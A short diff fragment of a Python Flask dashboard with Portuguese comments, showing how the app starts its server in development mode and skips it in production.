+        # Não executar app.run() aqui
+        return
+    else:
+        # Modo desenvolvimento - usar Flask diretamente
+        print(f"🌐 Modo desenvolvimento - iniciando Flask na porta {port}")
+        try:
+            app.run(host='0.0.0.0', port=port, debug=False, threaded=True, use_reloader=False)
+        except Exception as e:
+            print(f"❌ Erro ao iniciar Flask: {e}")
+            raise
 
 def start_dashboard():
     """Iniciar dashboard Flask em thread separada"""
